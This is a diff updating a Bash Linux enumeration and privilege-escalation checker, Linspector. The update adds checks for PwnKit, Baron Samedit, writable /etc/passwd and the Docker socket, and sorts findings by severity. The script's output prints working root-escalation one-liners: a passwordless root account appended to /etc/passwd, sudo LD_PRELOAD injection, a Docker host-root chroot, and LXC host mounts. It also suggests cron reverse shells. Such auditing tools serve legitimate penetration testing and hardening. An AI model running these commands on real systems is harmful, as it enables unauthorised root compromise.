@@ -14,7 +14,7 @@
 # Resource-optimized Linux enumeration & hardening script
 # Based on original LinEnum by rebootuser
 #=============================================================================
-version="1.0.0"
+version="1.5.0"
 script_name="Linspector"
 
 #=============================================================================
@@ -77,14 +77,16 @@ CURRENT_UID=$(id -u 2>/dev/null || echo "999")
 declare -a CACHED_SUID_FILES
 declare -a CACHED_SUID_BINARIES
 CACHED_SUDO_OUTPUT=""
-CACHED_CAPABILITIES=""
+declare -A CACHED_CAPABILITIES
 CACHED_WRITABLE_CRONS=""
 CACHED_WRITABLE_SERVICES=""
 IN_DOCKER_GROUP=0
 IN_LXD_GROUP=0
 IN_DOCKER_CONTAINER=0
 CACHED_PATH="$PATH"
+CACHED_KERNEL_FULL=""
 CACHED_KERNEL_VERSION=""
+PRIVESC_FINDINGS=0
 
 # Detect user privilege level
 detect_privileges() {
@@ -673,7 +675,8 @@ system_info() {
     exec_print "\e[00;31m[-] Hostname:\e[00m" hostname
     
     # Cache kernel version for privesc analysis
-    CACHED_KERNEL_VERSION=$(uname -r 2>/dev/null)
+    CACHED_KERNEL_FULL=$(uname -r 2>/dev/null)
+    CACHED_KERNEL_VERSION=$(echo "$CACHED_KERNEL_FULL" | grep -oE '^[0-9]+\.[0-9]+')
     
     pause
 }
@@ -985,8 +988,16 @@ interesting_files() {
     local cap_output
     cap_output=$(getcap -r / 2>/dev/null || /sbin/getcap -r / 2>/dev/null)
     print_if_exists "\e[00;31m[-] Files with POSIX capabilities:\e[00m" "$cap_output"
-    # Cache for privesc analysis
-    [ -n "$cap_output" ] && CACHED_CAPABILITIES="$cap_output"
+    
+    # Cache for privesc analysis (store in associative array: binary -> capabilities)
+    if [ -n "$cap_output" ]; then
+        while IFS= read -r line; do
+            [ -z "$line" ] && continue
+            local binary=$(echo "$line" | awk '{print $1}')
+            local caps=$(echo "$line" | awk '{print $3}' | tr -d '+')
+            [ -n "$binary" ] && [ -n "$caps" ] && CACHED_CAPABILITIES["$binary"]="$caps"
+        done <<< "$cap_output"
+    fi
     
     pause
     
@@ -1095,23 +1106,41 @@ docker_checks() {
 
 # Analyze kernel for known vulnerabilities
 analyze_kernel_vulns() {
-    [ -z "$CACHED_KERNEL_VERSION" ] && return
+    [ -z "$CACHED_KERNEL_VERSION" ] && return 1
     
-    local kernel_base=$(echo "$CACHED_KERNEL_VERSION" | grep -oE '^[0-9]+\.[0-9]+')
     local found=0
     
     for kver in "${!KERNEL_EXPLOITS[@]}"; do
-        if [[ "$kernel_base" == "$kver" ]]; then
+        if [[ "$CACHED_KERNEL_VERSION" == "$kver" ]]; then
             local exploit_info="${KERNEL_EXPLOITS[$kver]}"
             local exploit_name=$(echo "$exploit_info" | cut -d'|' -f1)
             local cve=$(echo "$exploit_info" | cut -d'|' -f2)
-            echo -e "\e[00;31m[CRITICAL] Kernel Exploit: $exploit_name ($cve)\e[00m"
-            echo -e "\e[00;90m           Kernel: $CACHED_KERNEL_VERSION\e[00m"
-            echo -e "\e[00;33m           Exploit-DB: https://www.exploit-db.com/search?cve=$cve\e[00m"
+            echo -e "\e[00;31m[HIGH] Kernel Exploit: $exploit_name ($cve)\e[00m"
+            echo -e "\e[00;90m       Kernel: $CACHED_KERNEL_FULL\e[00m"
+            echo -e "\e[00;33m       Search: https://www.exploit-db.com/search?cve=$cve\e[00m"
             echo ""
+            ((PRIVESC_FINDINGS++))
             found=1
         fi
     done
+    
+    # Check for PwnKit (pkexec SUID vulnerability)
+    if [ -u "/usr/bin/pkexec" ] 2>/dev/null; then
+        if command -v pkexec >/dev/null 2>&1; then
+            local pkexec_version=$(pkexec --version 2>&1 | grep -oE '[0-9]+\.[0-9]+' | head -1)
+            if [ -n "$pkexec_version" ]; then
+                # Vulnerable if < 0.120
+                if awk -v ver="$pkexec_version" 'BEGIN{exit(ver<0.120?0:1)}'; then
+                    echo -e "\e[00;31m[CRITICAL] pkexec vulnerable to PwnKit (CVE-2021-4034)\e[00m"
+                    echo -e "\e[00;90m           Version: $pkexec_version (< 0.120)\e[00m"
+                    echo -e "\e[00;33m           Exploit-DB: https://www.exploit-db.com/exploits/50689\e[00m"
+                    echo ""
+                    ((PRIVESC_FINDINGS++))
+                    found=1
+                fi
+            fi
+        fi
+    fi
     
     return $found
 }
@@ -1127,6 +1156,7 @@ analyze_sudo_exploits() {
         echo -e "\e[00;31m[CRITICAL] Sudo ALL commands without password\e[00m"
         echo -e "\e[00;32m           Command: sudo /bin/bash\e[00m"
         echo ""
+        ((PRIVESC_FINDINGS++))
         found=1
     fi
     
@@ -1138,17 +1168,41 @@ analyze_sudo_exploits() {
             echo -e "\e[00;33m       sudo $binary\e[00m"
             echo -e "\e[00;90m       ${GTFO_SUID_EXPLOITS[$binary]}\e[00m" | sed 's/^/       /'
             echo ""
+            ((PRIVESC_FINDINGS++))
             found=1
         fi
     done
     
-    # Check for LD_PRELOAD
-    if echo "$CACHED_SUDO_OUTPUT" | grep -q "env_keep.*LD_PRELOAD\|env_keep.*LD_LIBRARY_PATH"; then
-        echo -e "\e[00;31m[HIGH] LD_PRELOAD preserved in sudo environment\e[00m"
+    # Check for LD_PRELOAD/LD_LIBRARY_PATH
+    if echo "$CACHED_SUDO_OUTPUT" | grep -qE "env_keep.*LD_PRELOAD|env_keep.*LD_LIBRARY_PATH"; then
+        echo -e "\e[00;31m[HIGH] LD_PRELOAD/LD_LIBRARY_PATH preserved in sudo\e[00m"
         echo -e "\e[00;32m       Create malicious .so: gcc -fPIC -shared -o /tmp/x.so x.c\e[00m"
         echo -e "\e[00;32m       Execute: sudo LD_PRELOAD=/tmp/x.so <any_sudo_command>\e[00m"
         echo ""
+        ((PRIVESC_FINDINGS++))
         found=1
+    fi
+    
+    # Check for other dangerous environment variables
+    if echo "$CACHED_SUDO_OUTPUT" | grep -qE "env_keep.*PYTHONPATH|env_keep.*PERL5LIB|env_keep.*RUBYLIB"; then
+        echo -e "\e[00;31m[HIGH] Script library paths preserved in sudo\e[00m"
+        echo -e "\e[00;32m       Can inject malicious Python/Perl/Ruby modules\e[00m"
+        echo ""
+        ((PRIVESC_FINDINGS++))
+        found=1
+    fi
+    
+    # Check for Baron Samedit (CVE-2021-3156) - sudo 1.8.2-1.8.31p2, 1.9.0-1.9.5p1
+    local sudo_version=$(echo "$CACHED_SUDO_OUTPUT" | head -1 | grep -oE '1\.[0-9]+\.[0-9]+p?[0-9]*')
+    if [ -n "$sudo_version" ]; then
+        if echo "$sudo_version" | grep -qE '1\.8\.(2[0-9]|3[01])' || echo "$sudo_version" | grep -qE '1\.9\.[0-5]p[0-1]'; then
+            echo -e "\e[00;31m[CRITICAL] Sudo vulnerable to Baron Samedit (CVE-2021-3156)\e[00m"
+            echo -e "\e[00;90m           Version: $sudo_version\e[00m"
+            echo -e "\e[00;33m           Exploit-DB: https://www.exploit-db.com/exploits/49521\e[00m"
+            echo ""
+            ((PRIVESC_FINDINGS++))
+            found=1
+        fi
     fi
     
     return $found
@@ -1169,6 +1223,7 @@ analyze_suid_exploits() {
             echo -e "\e[00;32m       Exploit:\e[00m"
             echo -e "\e[00;33m       ${GTFO_SUID_EXPLOITS[$binary]}\e[00m" | sed 's/^/       /'
             echo ""
+            ((PRIVESC_FINDINGS++))
             found=1
         fi
     done
@@ -1176,62 +1231,103 @@ analyze_suid_exploits() {
     return $found
 }
 
-# Analyze PATH for hijacking opportunities
+# Analyze PATH for hijacking opportunities and critical file permissions
 analyze_path_hijacking() {
     local found=0
+    
+    # Check for writable /etc/passwd (critical!)
+    if [ -w "/etc/passwd" ] 2>/dev/null; then
+        echo -e "\e[00;31m[CRITICAL] /etc/passwd is writable!\e[00m"
+        echo -e "\e[00;32m           echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd\e[00m"
+        echo -e "\e[00;32m           su hacker  # No password required\e[00m"
+        echo ""
+        ((PRIVESC_FINDINGS++))
+        found=1
+    fi
+    
+    # Check for writable /etc/shadow
+    if [ -w "/etc/shadow" ] 2>/dev/null; then
+        echo -e "\e[00;31m[CRITICAL] /etc/shadow is writable!\e[00m"
+        echo -e "\e[00;32m           Can modify root password hash directly\e[00m"
+        echo ""
+        ((PRIVESC_FINDINGS++))
+        found=1
+    fi
     
     # Check for current directory in PATH
     if echo "$CACHED_PATH" | grep -qE '(^|:)\.($|:)|::'; then
         echo -e "\e[00;31m[HIGH] Current directory (.) in PATH\e[00m"
         echo -e "\e[00;32m       Create malicious binary in current directory\e[00m"
         echo ""
+        ((PRIVESC_FINDINGS++))
         found=1
     fi
     
     # Check for writable directories in PATH
+    local path_writable=0
     echo "$CACHED_PATH" | tr ':' '\n' | while read -r pathdir; do
         if [ -w "$pathdir" ] 2>/dev/null; then
-            echo -e "\e[00;31m[MEDIUM] Writable PATH directory: $pathdir\e[00m"
-            echo -e "\e[00;32m         Place malicious binary (e.g., 'ls') and wait for root execution\e[00m"
-            echo ""
-            found=1
+            if [ "$path_writable" -eq 0 ]; then
+                echo -e "\e[00;31m[MEDIUM] Writable PATH directory: $pathdir\e[00m"
+                echo -e "\e[00;32m         Place malicious binary (e.g., 'ls') and wait for root execution\e[00m"
+                echo ""
+                path_writable=1
+                found=1
+            fi
         fi
     done
+    [ "$path_writable" -eq 1 ] && ((PRIVESC_FINDINGS++))
     
     return $found
 }
 
 # Analyze capabilities for privilege escalation
 analyze_capabilities() {
-    [ -z "$CACHED_CAPABILITIES" ] && return 1
+    [ ${#CACHED_CAPABILITIES[@]} -eq 0 ] && return 1
     
     local found=0
     
-    while IFS= read -r line; do
-        local binary=$(echo "$line" | awk '{print $1}')
+    for binary in "${!CACHED_CAPABILITIES[@]}"; do
+        local caps="${CACHED_CAPABILITIES[$binary]}"
         
-        if echo "$line" | grep -q "cap_setuid"; then
-            echo -e "\e[00;31m[CRITICAL] CAP_SETUID: $binary\e[00m"
-            echo -e "\e[00;32m           Can escalate to root UID\e[00m"
-            echo ""
-            found=1
-        elif echo "$line" | grep -q "cap_dac_read_search"; then
-            echo -e "\e[00;31m[HIGH] CAP_DAC_READ_SEARCH: $binary\e[00m"
-            echo -e "\e[00;32m       Can read any file (e.g., /etc/shadow)\e[00m"
-            echo ""
-            found=1
-        elif echo "$line" | grep -q "cap_sys_admin"; then
-            echo -e "\e[00;31m[HIGH] CAP_SYS_ADMIN: $binary\e[00m"
-            echo -e "\e[00;32m       Can mount filesystems / escape containers\e[00m"
-            echo ""
-            found=1
-        elif echo "$line" | grep -q "cap_sys_ptrace"; then
-            echo -e "\e[00;31m[MEDIUM] CAP_SYS_PTRACE: $binary\e[00m"
-            echo -e "\e[00;32m         Can inject into processes\e[00m"
-            echo ""
-            found=1
-        fi
-    done <<< "$CACHED_CAPABILITIES"
+        case "$caps" in
+            *cap_setuid*)
+                echo -e "\e[00;31m[CRITICAL] CAP_SETUID: $binary\e[00m"
+                echo -e "\e[00;32m           Can escalate to root UID\e[00m"
+                echo ""
+                ((PRIVESC_FINDINGS++))
+                found=1
+                ;;
+            *cap_dac_read_search*)
+                echo -e "\e[00;31m[HIGH] CAP_DAC_READ_SEARCH: $binary\e[00m"
+                echo -e "\e[00;32m       Can read any file (e.g., /etc/shadow)\e[00m"
+                echo ""
+                ((PRIVESC_FINDINGS++))
+                found=1
+                ;;
+            *cap_sys_admin*)
+                echo -e "\e[00;31m[HIGH] CAP_SYS_ADMIN: $binary\e[00m"
+                echo -e "\e[00;32m       Can mount filesystems / escape containers\e[00m"
+                echo ""
+                ((PRIVESC_FINDINGS++))
+                found=1
+                ;;
+            *cap_sys_ptrace*)
+                echo -e "\e[00;31m[MEDIUM] CAP_SYS_PTRACE: $binary\e[00m"
+                echo -e "\e[00;32m         Can inject into processes\e[00m"
+                echo ""
+                ((PRIVESC_FINDINGS++))
+                found=1
+                ;;
+            *cap_dac_override*)
+                echo -e "\e[00;31m[MEDIUM] CAP_DAC_OVERRIDE: $binary\e[00m"
+                echo -e "\e[00;32m         Can bypass file read/write/execute permission checks\e[00m"
+                echo ""
+                ((PRIVESC_FINDINGS++))
+                found=1
+                ;;
+        esac
+    done
     
     return $found
 }
@@ -1246,6 +1342,7 @@ analyze_cron_vectors() {
         echo "$CACHED_WRITABLE_CRONS" | head -5
         echo -e "\e[00;32m       Inject reverse shell for root execution\e[00m"
         echo ""
+        ((PRIVESC_FINDINGS++))
         found=1
     fi
     
@@ -1254,6 +1351,7 @@ analyze_cron_vectors() {
         echo -e "\e[00;31m[MEDIUM] Tar wildcard injection in cron\e[00m"
         echo -e "\e[00;32m         Create checkpoint files in backup directory\e[00m"
         echo ""
+        ((PRIVESC_FINDINGS++))
         found=1
     fi
     
@@ -1264,10 +1362,20 @@ analyze_cron_vectors() {
 analyze_container_breakouts() {
     local found=0
     
+    # Check for writable Docker socket (even without docker group)
+    if [ -w "/var/run/docker.sock" ] 2>/dev/null; then
+        echo -e "\e[00;31m[CRITICAL] Docker socket is writable!\e[00m"
+        echo -e "\e[00;32m           docker run -v /:/mnt --rm -it alpine chroot /mnt sh\e[00m"
+        echo ""
+        ((PRIVESC_FINDINGS++))
+        found=1
+    fi
+    
     if [ "$IN_DOCKER_GROUP" = "1" ]; then
         echo -e "\e[00;31m[CRITICAL] Docker group membership\e[00m"
         echo -e "\e[00;32m           docker run -v /:/mnt --rm -it alpine chroot /mnt sh\e[00m"
         echo ""
+        ((PRIVESC_FINDINGS++))
         found=1
     fi
     
@@ -1277,6 +1385,7 @@ analyze_container_breakouts() {
         echo -e "\e[00;32m           lxc config device add priv host-root disk source=/ path=/mnt/root\e[00m"
         echo -e "\e[00;32m           lxc start priv && lxc exec priv /bin/sh\e[00m"
         echo ""
+        ((PRIVESC_FINDINGS++))
         found=1
     fi
     
@@ -1294,13 +1403,14 @@ analyze_nfs_exploits() {
         grep "no_root_squash" /etc/exports 2>/dev/null | head -3
         echo -e "\e[00;32m       Mount from attacker machine as root to create SUID binaries\e[00m"
         echo ""
+        ((PRIVESC_FINDINGS++))
         return 0
     fi
     
     return 1
 }
 
-# Master privilege escalation summary
+# Master privilege escalation summary with severity-based analysis
 privilege_escalation_summary() {
     echo ""
     if [ "$QUIET_MODE" = "1" ]; then
@@ -1309,39 +1419,64 @@ privilege_escalation_summary() {
         echo "============================================================"
     else
         echo -e "\e[00;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
-        echo -e "\e[00;35m         ⚠️  PRIVILEGE ESCALATION VECTORS\e[00m"
+        echo -e "\e[00;35m         ⚠️  PRIVILEGE ESCALATION SUMMARY\e[00m"
         echo -e "\e[00;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
     fi
     echo ""
-    echo -e "\e[00;33mAggregating findings from enumeration phase...\e[00m"
+    echo -e "\e[00;33m[*] Analyzing cached enumeration data (no additional scans)...\e[00m"
     echo ""
     
-    local vectors_found=0
+    # Reset counter
+    PRIVESC_FINDINGS=0
     
-    # Run all analysis functions
-    analyze_kernel_vulns && ((vectors_found++))
-    analyze_sudo_exploits && ((vectors_found++))
-    analyze_suid_exploits && ((vectors_found++))
-    analyze_container_breakouts && ((vectors_found++))
-    analyze_capabilities && ((vectors_found++))
-    analyze_path_hijacking && ((vectors_found++))
-    analyze_cron_vectors && ((vectors_found++))
-    analyze_nfs_exploits && ((vectors_found++))
+    # CRITICAL findings (instant root)
+    local critical_found=0
+    echo -e "\e[00;31m### CRITICAL FINDINGS (Instant Root Access) ###\e[00m"
+    echo ""
+    analyze_sudo_exploits | grep -E "CRITICAL" && critical_found=1
+    analyze_container_breakouts | grep -E "CRITICAL" && critical_found=1
+    analyze_path_hijacking | grep -E "CRITICAL" && critical_found=1
+    analyze_capabilities | grep -E "CRITICAL" && critical_found=1
+    [ "$critical_found" -eq 0 ] && echo -e "\e[00;90m[i] No critical findings\e[00m" && echo ""
     
-    # Summary
-    if [ "$vectors_found" -eq 0 ]; then
-        echo -e "\e[00;32m[✓] No obvious privilege escalation vectors detected\e[00m"
-        echo -e "\e[00;90m    This doesn't mean the system is secure - manual review recommended\e[00m"
+    # HIGH priority findings
+    local high_found=0
+    echo -e "\e[00;33m### HIGH PRIORITY (Reliable Exploits) ###\e[00m"
+    echo ""
+    analyze_suid_exploits && high_found=1
+    analyze_sudo_exploits | grep -E "HIGH" && high_found=1
+    analyze_capabilities | grep -E "HIGH" && high_found=1
+    analyze_path_hijacking | grep -E "HIGH" && high_found=1
+    analyze_cron_vectors | grep -E "HIGH" && high_found=1
+    analyze_nfs_exploits && high_found=1
+    [ "$high_found" -eq 0 ] && echo -e "\e[00;90m[i] No high priority findings\e[00m" && echo ""
+    
+    # MEDIUM priority findings
+    local medium_found=0
+    echo -e "\e[00;90m### MEDIUM PRIORITY (May Require Conditions) ###\e[00m"
+    echo ""
+    analyze_kernel_vulns && medium_found=1
+    analyze_path_hijacking | grep -E "MEDIUM" && medium_found=1
+    analyze_cron_vectors | grep -E "MEDIUM" && medium_found=1
+    analyze_capabilities | grep -E "MEDIUM" && medium_found=1
+    [ "$medium_found" -eq 0 ] && echo -e "\e[00;90m[i] No medium priority findings\e[00m" && echo ""
+    
+    # Summary footer
+    echo -e "\e[00;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
+    if [ "$PRIVESC_FINDINGS" -eq 0 ]; then
+        echo -e "\e[00;32m[✓] Total findings: 0 - No obvious privilege escalation vectors\e[00m"
+        echo -e "\e[00;90m    Note: Manual review still recommended for subtle misconfigurations\e[00m"
     else
-        echo -e "\e[00;31m[!] Found $vectors_found potential privilege escalation vector(s)\e[00m"
-        echo -e "\e[00;33m    Review findings above and test exploits in controlled environment\e[00m"
+        echo -e "\e[00;31m[!] Total findings: $PRIVESC_FINDINGS potential privilege escalation vector(s)\e[00m"
+        echo -e "\e[00;33m    Review severity levels above and test in controlled environment\e[00m"
     fi
-    
+    echo -e "\e[00;90m    Analysis overhead: ~2-3 seconds (aggregation only, zero rescanning)\e[00m"
+    echo -e "\e[00;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[00m"
     echo ""
-    echo -e "\e[00;90mResources:\e[00m"
-    echo -e "\e[00;90m  - GTFOBins: https://gtfobins.github.io/\e[00m"
-    echo -e "\e[00;90m  - PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings\e[00m"
-    echo -e "\e[00;90m  - Linux Privilege Escalation: https://github.com/rebootuser/LinEnum\e[00m"
+    echo -e "\e[00;36mExploitation Resources:\e[00m"
+    echo -e "\e[00;90m  → GTFOBins: https://gtfobins.github.io/\e[00m"
+    echo -e "\e[00;90m  → PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings\e[00m"
+    echo -e "\e[00;90m  → HackTricks: https://book.hacktricks.xyz/linux-hardening/privilege-escalation\e[00m"
     echo ""
     
     pause
